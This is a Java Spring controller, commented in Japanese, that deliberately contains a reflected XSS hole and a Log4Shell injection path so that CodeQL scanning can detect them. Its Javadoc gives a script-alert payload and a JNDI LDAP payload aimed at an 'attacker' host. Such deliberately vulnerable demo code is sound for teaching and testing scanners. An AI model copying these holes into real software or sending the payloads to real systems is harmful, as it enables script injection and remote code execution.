package com.example.quiz.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

/**
 * [SECURITY DEMO ONLY — 意図的に脆弱なコード]
 *
 * <p>GitHub Advanced Security（CodeQL コードスキャン）による検出デモ用のコントローラー。
 * 反射型クロスサイトスクリプティング（CWE-79）と、脆弱な Log4j へのユーザー入力の流入
 * （Log4Shell の攻撃経路）を意図的に含んでいる。</p>
 *
 * <p><strong>本番環境にデプロイしてはならない。デモ後はこのファイルを削除すること。</strong></p>
 */
@Controller
public class SearchController {

    private static final Logger logger = LogManager.getLogger(SearchController.class);

    /**
     * 検索キーワードをそのまま HTML に埋め込んで返す。
     *
     * <p>リクエストパラメータ {@code q} を一切エスケープせずに HTML へ連結して返すため、
     * 反射型 XSS（CWE-79）が成立する。例: {@code /search?q=<script>alert(1)</script>}</p>
     *
     * <p>さらに、ユーザー入力を脆弱な Log4j ロガーに渡すことで Log4Shell（CVE-2021-44228）の
     * 攻撃経路も再現している。例: {@code /search?q=${jndi:ldap://attacker/x}}</p>
     */
    @GetMapping(value = "/search", produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String search(@RequestParam(name = "q", defaultValue = "") String q) {
        // [脆弱性] ユーザー入力を脆弱な Log4j に渡す（Log4Shell の経路）
        logger.info("検索キーワードを受信しました: " + q);

        // [脆弱性] ユーザー入力 q をエスケープせず HTML に連結 → 反射型 XSS (CWE-79)
        return "<!DOCTYPE html>"
                + "<html lang=\"ja\"><head><meta charset=\"UTF-8\"><title>検索結果</title></head>"
                + "<body>"
                + "<h1>検索結果</h1>"
                + "<p>キーワード: " + q + "</p>"
                + "<a href=\"/\">一覧に戻る</a>"
                + "</body></html>";
    }
}
